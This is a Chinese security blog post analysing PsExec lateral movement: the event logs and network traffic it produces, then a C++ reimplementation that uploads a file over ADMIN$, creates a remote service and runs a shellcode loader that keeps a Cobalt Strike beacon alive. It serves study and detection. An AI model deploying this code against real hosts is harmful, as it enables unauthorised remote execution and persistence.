<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>psexec原理分析</title>
    <link href="/2021/06/20/psexec/"/>
    <url>/2021/06/20/psexec/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>参加某行动时通过psexec横向过几台主机,正好之前在网上看到很多大佬分析过这款工具,今天也自己动手重新分析一次<br>因为很大程度上是学着大佬分析思路来分析的,所以先把参考写在前面:<br><a href="https://payloads.online/archivers/2020-04-02/1">https://payloads.online/archivers/2020-04-02/1</a><br><a href="https://blog.csdn.net/qq_41874930/article/details/108455478">https://blog.csdn.net/qq_41874930/article/details/108455478</a></p><h2 id="Psexec"><a href="#Psexec" class="headerlink" title="Psexec"></a>Psexec</h2><p>Psexec被编写的初衷是为了方便服务器管理员管理大量的机器而开发的，但由于它的便捷，同时也被黑客使用。<br>psexec工具下载地址:<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">https://docs.microsoft.com/en-us/sysinternals/downloads/psexec</a><br>cs也直接集成了这款工具</p><p><img src="/img/psexec/1.png"></p><h2 id="Psexec原理分析"><a href="#Psexec原理分析" class="headerlink" title="Psexec原理分析"></a>Psexec原理分析</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><ul><li>win10  ip：192.168.154.7</li><li>win server 2008  X64 192.168.154.31</li></ul><p>假设已经得到win10主机的system权限<br>在cs上通过psexec64来横向win2008</p><p><img src="/img/psexec/2.png"></p><p>这里看到是需要账户和密码的,但是在内网环境中很多密码都是批量设置的,也就是说通过已经拿到的win10的hash去尝试登录内网其他主机<br>可以看到win2008直接上线,并且是system权限</p><p><img src="/img/psexec/3.png"></p><p>看一下win2008的安全日志</p><p><img src="/img/psexec/4.png"></p><p>看到有多个安全日志的产生<br>在事件4624中,看到了win10的ip,也就是申请管理的ip</p><p><img src="/img/psexec/5.png"></p><p>采用的NTMLv2协议,所以即便不知道明文,有hash值就可以转递</p><p><img src="/img/psexec/6.png"></p><p>再看系统日志</p><p><img src="/img/psexec/7.png"></p><p>ADMIN$这个是ipc共享中的默认共享,通常指向C:\Windows</p><p><img src="/img/psexec/8.png"></p><p>猜想就是通过这个exe上线<br><img src="/img/psexec/9.png"></p><p>这里肯定是与直接在win10上通过Psexec管理win2008的流程是不一样的,cs上执行主要目的还是反弹shell到cs上</p><p>大致流程为:</p><ol><li><p>登陆远程主机   事件ID4624</p></li><li><p>连接admin$共享   事件ID7045</p></li><li><p>写入xxxx.exe文件到共享目录下也就是c:\windows下</p></li><li><p>执行xxxx.exe,随即上线</p></li></ol><p>通过wireshark网络分析<br>直接在win10上通过psexec管理win2008</p><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">.\PsExec.exe \\192.168.154.31 -u administrator -p 123456 cmd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><p><img src="/img/psexec/10.png"></p><p><img src="/img/psexec/11.png"></p><p>设置过滤规则</p><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">ip.src&#x3D;&#x3D;192.168.154.31 or ip.dst&#x3D;&#x3D;192.168.154.31<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><p><img src="/img/psexec/12.png"></p><ol><li><p>先进行TCP三次握手</p></li><li><p>协商协议</p></li><li><p>进行NTML验证</p></li><li><p>尝试连接$IPC</p></li><li><p>尝试连接ADMIN$</p></li><li><p>尝试写入PSEXESVC.exe</p></li></ol><p><img src="/img/psexec/13.png"></p><p>后续TCP数据包的内容,4D5A,标准的pe文件</p><p><img src="/img/psexec/14.png"></p><p>文件写入完毕后,执行API安装服务</p><p><img src="/img/psexec/15.png"></p><p>服务启动后会建立一个管道</p><p><img src="/img/psexec/16.png"></p><p>实际上一共创建了4个管道</p><p><img src="/img/psexec/17.png"></p><p><img src="/img/psexec/18.png"></p><p>整体流程跟从被连接主机的事件看到的流程基本一致。基本都是ntlm认证、连接共享目录admin$、写文件psexesvc到共享目录、调用svcctl服务来间接调用psexesvc服务、创建四个命名管道。</p><h2 id="实现psexec"><a href="#实现psexec" class="headerlink" title="实现psexec"></a>实现psexec</h2><h3 id="一-与目标主机建立SMB连接"><a href="#一-与目标主机建立SMB连接" class="headerlink" title="一.与目标主机建立SMB连接"></a>一.与目标主机建立SMB连接</h3><p>WNetAddConnection2</p><div class="code-wrapper"><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">DWORD WNetAddConnection2W(  LPNETRESOURCEW lpNetResource,  LPCWSTR        lpPassword,  LPCWSTR        lpUserName,  DWORD          dwFlags);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p>这里有例子:<a href="https://docs.microsoft.com/en-us/windows/win32/api/winnetwk/nf-winnetwk-wnetaddconnection2w">https://docs.microsoft.com/en-us/windows/win32/api/winnetwk/nf-winnetwk-wnetaddconnection2w</a></p><div class="code-wrapper"><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">DWORD ConnectSMBServer(LPCWSTR lpwsHost, LPCWSTR lpwsUserName, LPCWSTR lpwsPassword)&#123;    &#x2F;&#x2F; 用于存放SMB共享资源格式    PWCHAR lpwsIPC &#x3D; new WCHAR[MAX_PATH];    DWORD dwRetVal; &#x2F;&#x2F; 函数返回值    NETRESOURCE nr; &#x2F;&#x2F; 连接的详细信息    DWORD dwFlags; &#x2F;&#x2F; 连接选项    ZeroMemory(&amp;nr, sizeof(NETRESOURCE));    swprintf(lpwsIPC, MAX_PATH, TEXT(&quot;\%s\admin$&quot;), lpwsHost);    nr.dwType &#x3D; RESOURCETYPE_ANY; &#x2F;&#x2F; 枚举所有资源    nr.lpLocalName &#x3D; NULL;    nr.lpRemoteName &#x3D; lpwsIPC; &#x2F;&#x2F; 资源的网络名    nr.lpProvider &#x3D; NULL;    &#x2F;&#x2F; 如果设置了此位标志，则操作系统将在用户登录时自动尝试恢复连接。    dwFlags &#x3D; CONNECT_UPDATE_PROFILE;    dwRetVal &#x3D; WNetAddConnection2(&amp;nr, lpwsPassword, lpwsUserName, dwFlags);    if (dwRetVal &#x3D;&#x3D; NO_ERROR)     &#123;        printf(&quot;Connection added to %s\n&quot;, nr.lpRemoteName);        return dwRetVal;    &#125;    printf(&quot;WNetAddConnection2 failed with error: %d\n&quot;, dwRetVal);    return -1;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><h3 id="二-上传文件到目标主机"><a href="#二-上传文件到目标主机" class="headerlink" title="二.上传文件到目标主机"></a>二.上传文件到目标主机</h3><p>将现有文件拷贝到新文件</p><div class="code-wrapper"><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">BOOL CopyFile(  LPCTSTR lpExistingFileName,  LPCTSTR lpNewFileName,  BOOL    bFailIfExists);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p><a href="https://docs.microsoft.com/zh-cn/windows/win32/api/winbase/nf-winbase-copyfile?f1url=?appId=Dev16IDEF1&l=ZH-CN&k=k(WINBASE%252FCopyFile);k(CopyFile);k(DevLang-C%252B%252B);k(TargetOS-Windows)&rd=true">https://docs.microsoft.com/zh-cn/windows/win32/api/winbase/nf-winbase-copyfile?f1url=%3FappId%3DDev16IDEF1%26l%3DZH-CN%26k%3Dk(WINBASE%252FCopyFile);k(CopyFile);k(DevLang-C%252B%252B);k(TargetOS-Windows)%26rd%3Dtrue</a></p><div class="code-wrapper"><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">BOOL UploadFileBySMB(LPCWSTR lpwsSrcPath, LPCWSTR lpwsDstPath)&#123;    DWORD dwRetVal;    dwRetVal &#x3D; CopyFile(lpwsSrcPath, lpwsDstPath, FALSE);    return dwRetVal &gt; 0 ? TRUE : FALSE;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><h3 id="三-开启服务"><a href="#三-开启服务" class="headerlink" title="三.开启服务"></a>三.开启服务</h3><p><a href="https://docs.microsoft.com/zh-cn/windows/win32/api/winsvc/nf-winsvc-openscmanagera?redirectedfrom=MSDN&amp;f1url=?appId=Dev16IDEF1&l=ZH-CN&k=k(WINSVC%252FOpenSCManager);k(OpenSCManager);k(DevLang-C%252B%252B);k(TargetOS-Windows)&rd=true">https://docs.microsoft.com/zh-cn/windows/win32/api/winsvc/nf-winsvc-openscmanagera?redirectedfrom=MSDN&amp;f1url=%3FappId%3DDev16IDEF1%26l%3DZH-CN%26k%3Dk(WINSVC%252FOpenSCManager);k(OpenSCManager);k(DevLang-C%252B%252B);k(TargetOS-Windows)%26rd%3Dtrue</a></p><div class="code-wrapper"><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">SC_HANDLE OpenSCManagerA(  LPCSTR lpMachineName,  LPCSTR lpDatabaseName,  DWORD  dwDesiredAccess);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew">https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew</a></p><div class="code-wrapper"><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">SC_HANDLE CreateServiceW(  SC_HANDLE hSCManager,  LPCWSTR   lpServiceName,  LPCWSTR   lpDisplayName,  DWORD     dwDesiredAccess,  DWORD     dwServiceType,  DWORD     dwStartType,  DWORD     dwErrorControl,  LPCWSTR   lpBinaryPathName,  LPCWSTR   lpLoadOrderGroup,  LPDWORD   lpdwTagId,  LPCWSTR   lpDependencies,  LPCWSTR   lpServiceStartName,  LPCWSTR   lpPassword);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p>先使用<code>OpenSCManager</code>在目标机器上建立与服务控制管理器的连接，并打开指定的服务控制管理器数据库</p><p>然后用<code>CreateService</code>创建一个服务,再通过<code>OpenService</code>,<code>StartService</code>打开并开启服务</p><div class="code-wrapper"><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">BOOL CreateServices(LPCWSTR lpwsSCMServer, LPCWSTR lpwsServiceName, LPCWSTR lpwsServicePath)&#123;    wprintf(L&quot;Will Create Service %s\n&quot; ,lpwsServiceName);    SC_HANDLE hSCM;    SC_HANDLE hService;    SERVICE_STATUS ss;    hSCM &#x3D; OpenSCManager(lpwsSCMServer, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);    if (hSCM &#x3D;&#x3D; NULL)     &#123;        printf(&quot;OpenSCManager Error: %d\n&quot;,GetLastError());        return -1;    &#125;    hService &#x3D; CreateService(        hSCM, &#x2F;&#x2F; 服务控制管理器数据库的句柄        lpwsServiceName, &#x2F;&#x2F; 要安装的服务的名称        lpwsServiceName, &#x2F;&#x2F; 用户界面程序用来标识服务的显示名称        GENERIC_ALL, &#x2F;&#x2F; 访问权限        SERVICE_WIN32_OWN_PROCESS, &#x2F;&#x2F; 与一个或多个其他服务共享一个流程的服务        SERVICE_DEMAND_START, &#x2F;&#x2F; 当进程调用StartService函数时，由服务控制管理器启动的服务 。        SERVICE_ERROR_IGNORE, &#x2F;&#x2F; 启动程序将忽略该错误并继续启动操作        lpwsServicePath, &#x2F;&#x2F; 服务二进制文件的标准路径        NULL,        NULL,        NULL,        NULL,        NULL);    if (hService &#x3D;&#x3D; NULL)     &#123;        printf(&quot;CreateService Error: %d\n&quot;,GetLastError());        return -1;    &#125;    wprintf(L&quot;Create Service Success : %s\n&quot;,lpwsServicePath);    hService &#x3D; OpenService(hSCM, lpwsServiceName, GENERIC_ALL);    if (hService &#x3D;&#x3D; NULL)     &#123;        printf(&quot;OpenService Error: %d\n&quot;, GetLastError());        return -1;    &#125;    printf(&quot;OpenService Success: %d!\n&quot;);    StartService(hService, NULL, NULL);    return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p>这里我生成一个cs的马,改名为sd</p><p><img src="/img/psexec/19.png"></p><p>win2008</p><p><img src="/img/psexec/20.png"></p><p>但是以这种方式运行服务的话一会儿就会掉,随即cs掉线</p><p><img src="/img/psexec/21.png"></p><p>打开系统日志查看</p><p><img src="/img/psexec/22.png"></p><p>我的理解是:要创建一个服务的话这个服务得是满足windows服务规定的格式,而不是随便一个pe文件都可以充当服务</p><h2 id="编写服务程序"><a href="#编写服务程序" class="headerlink" title="编写服务程序"></a>编写服务程序</h2><h3 id="服务介绍"><a href="#服务介绍" class="headerlink" title="服务介绍"></a>服务介绍</h3><hr><div class="code-wrapper"><pre><code>几乎所有的操作系统在启动的时候都会启动一些不需要与用户交互的进程，这些进程在Windows中就被称作服务。它通常用于实现客户／服务器模式中的服务器方，如我们常见的Ｗeb服务IIS，当操作系统在启动后它就自动被运行，不管是否有人登陆到系统只要系统开启它就能得到运行。服务程序、服务控制程序（SCP，service control program）和服务控制管理器（SCM，service control manager）组成了Windows服务。我们可以通过服务控制程序操纵服务控制管理器来配置、启动、暂停、停止服务程序。其中服务程序和服务控制程序可以由我们自己来编写扩展，而服务控制管理器（windowssystem32servics.exe）则是操作系统内置的一个部件。SCM本身也是一个服务程序（windowssystem32servics.exe），作为windows的后台服务运行的。Winlogon在系统引导的早期会将SCM启动起来。</code></pre></div><hr><p>可以看一下这篇文章,写的比较详细<br><a href="https://blog.csdn.net/swartz_lubel/article/details/70255686">https://blog.csdn.net/swartz_lubel/article/details/70255686</a></p><p>倾旋博客中也已经给出了一个编写windwos服务的模板<br>还有几篇介绍windows服务编写的:<br> <a href="http://www.haoservice.cn/2019/11/27/Applied13%E8%AE%A4%E8%AF%86windows%E6%9C%8D%E5%8A%A1%E5%B9%B6%E4%BD%BF%E7%94%A8VC++%E5%88%9B%E5%BB%BAwindows%E6%9C%8D%E5%8A%A1%E7%A8%8B%E5%BA%8F/">http://www.haoservice.cn/2019/11/27/Applied13%E8%AE%A4%E8%AF%86windows%E6%9C%8D%E5%8A%A1%E5%B9%B6%E4%BD%BF%E7%94%A8VC++%E5%88%9B%E5%BB%BAwindows%E6%9C%8D%E5%8A%A1%E7%A8%8B%E5%BA%8F/</a></p><p><a href="https://www.codeproject.com/Articles/499465/Simple-Windows-Service-in-Cplusplus">https://www.codeproject.com/Articles/499465/Simple-Windows-Service-in-Cplusplus</a><br>模板代码执行:</p><p><img src="/img/psexec/23.png"></p><p>在模板上面加一点执行shellcode的代码:</p><div class="code-wrapper"><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;windows.h&gt;#include &lt;iostream&gt;unsigned char buf[] &#x3D; shellcode#define SLEEP_TIME 5000                          &#x2F;*间隔时间*&#x2F;#define LOGFILE &quot;C:\\Windows\\log.txt&quot;              &#x2F;*信息输出文件*&#x2F;SERVICE_STATUS ServiceStatus;  &#x2F;*服务状态*&#x2F;SERVICE_STATUS_HANDLE hStatus; &#x2F;*服务状态句柄*&#x2F;void  ServiceMain(int argc, char** argv);void  CtrlHandler(DWORD request);int   InitService();int main(int argc, CHAR* argv[])&#123;    WCHAR WserviceName[] &#x3D; TEXT(&quot;sdd&quot;);    SERVICE_TABLE_ENTRY ServiceTable[2];    ServiceTable[0].lpServiceName &#x3D; WserviceName;    ServiceTable[0].lpServiceProc &#x3D; (LPSERVICE_MAIN_FUNCTION)ServiceMain;    ServiceTable[1].lpServiceName &#x3D; NULL;    ServiceTable[1].lpServiceProc &#x3D; NULL;    StartServiceCtrlDispatcher(ServiceTable);    return 0;&#125;int WriteToLog(const char* str)&#123;    FILE* pfile;    fopen_s(&amp;pfile, LOGFILE, &quot;a+&quot;);    if (pfile &#x3D;&#x3D; NULL)    &#123;        return -1;    &#125;    fprintf_s(pfile, &quot;%s\n&quot;, str);    fclose(pfile);    return 0;&#125;&#x2F;*Service initialization*&#x2F;int InitService()&#123;    CHAR Message[] &#x3D; &quot;Monitoring started.&quot;;    OutputDebugString(TEXT(&quot;Monitoring started.&quot;));    int result;    result &#x3D; WriteToLog(Message);    return(result);&#125;&#x2F;*Control Handler*&#x2F;void CtrlHandler(DWORD request)&#123;    switch (request)    &#123;    case SERVICE_CONTROL_STOP:        WriteToLog(&quot;Monitoring stopped.&quot;);        ServiceStatus.dwWin32ExitCode &#x3D; 0;        ServiceStatus.dwCurrentState &#x3D; SERVICE_STOPPED;        SetServiceStatus(hStatus, &amp;ServiceStatus);        return;    case SERVICE_CONTROL_SHUTDOWN:        WriteToLog(&quot;Monitoring stopped.&quot;);        ServiceStatus.dwWin32ExitCode &#x3D; 0;        ServiceStatus.dwCurrentState &#x3D; SERVICE_STOPPED;        SetServiceStatus(hStatus, &amp;ServiceStatus);        return;    default:        break;    &#125;    &#x2F;* Report current status  *&#x2F;    SetServiceStatus(hStatus, &amp;ServiceStatus);    return;&#125;void ServiceMain(int argc, char** argv)&#123;    WCHAR WserviceName[] &#x3D; TEXT(&quot;sdd&quot;);    int error;    ServiceStatus.dwServiceType &#x3D;        SERVICE_WIN32;    ServiceStatus.dwCurrentState &#x3D;        SERVICE_START_PENDING;    &#x2F;*在本例中只接受系统关机和停止服务两种控制命令*&#x2F;    ServiceStatus.dwControlsAccepted &#x3D;        SERVICE_ACCEPT_SHUTDOWN |        SERVICE_ACCEPT_STOP;    ServiceStatus.dwWin32ExitCode &#x3D; 0;    ServiceStatus.dwServiceSpecificExitCode &#x3D; 0;    ServiceStatus.dwCheckPoint &#x3D; 0;    ServiceStatus.dwWaitHint &#x3D; 0;    hStatus &#x3D; ::RegisterServiceCtrlHandler(        WserviceName,        (LPHANDLER_FUNCTION)CtrlHandler);    if (hStatus &#x3D;&#x3D; (SERVICE_STATUS_HANDLE)0)    &#123;        WriteToLog(&quot;RegisterServiceCtrlHandler failed&quot;);        return;    &#125;    WriteToLog(&quot;RegisterServiceCtrlHandler success&quot;);    &#x2F;* Initialize Service   *&#x2F;    error &#x3D; InitService();    if (error)    &#123;        &#x2F;* Initialization failed  *&#x2F;        ServiceStatus.dwCurrentState &#x3D;            SERVICE_STOPPED;        ServiceStatus.dwWin32ExitCode &#x3D; -1;        SetServiceStatus(hStatus, &amp;ServiceStatus);        return;    &#125;    LPVOID Memory &#x3D; VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);    memcpy(Memory, buf, sizeof(buf));    ((void(*)())Memory)();    &#x2F;*向SCM 报告运行状态*&#x2F;    ServiceStatus.dwCurrentState &#x3D;        SERVICE_RUNNING;    SetServiceStatus(hStatus, &amp;ServiceStatus);    &#x2F;*do something you want to do in this while loop*&#x2F;    MEMORYSTATUS memstatus;    while (ServiceStatus.dwCurrentState &#x3D;&#x3D;        SERVICE_RUNNING)    &#123;        char buffer[16];        GlobalMemoryStatus(&amp;memstatus);        int availmb &#x3D; memstatus.dwAvailPhys &#x2F; 1024 &#x2F; 1024;        sprintf_s(buffer, 100, &quot;available memory is %dMB&quot;, availmb);        int result &#x3D; WriteToLog(buffer);        if (result)        &#123;            ServiceStatus.dwCurrentState &#x3D; SERVICE_STOPPED;            ServiceStatus.dwWin32ExitCode &#x3D; -1;            SetServiceStatus(hStatus,                &amp;ServiceStatus);            return;        &#125;        Sleep(SLEEP_TIME);    &#125;    WriteToLog(&quot;service stopped&quot;);    return;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p><img src="/img/psexec/24.png"></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>本次研究psexec到这就基本结束了,我自己是没有能力研究出来的,参考了很多大佬的文章,尤其是倾旋大佬,再次感谢！</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
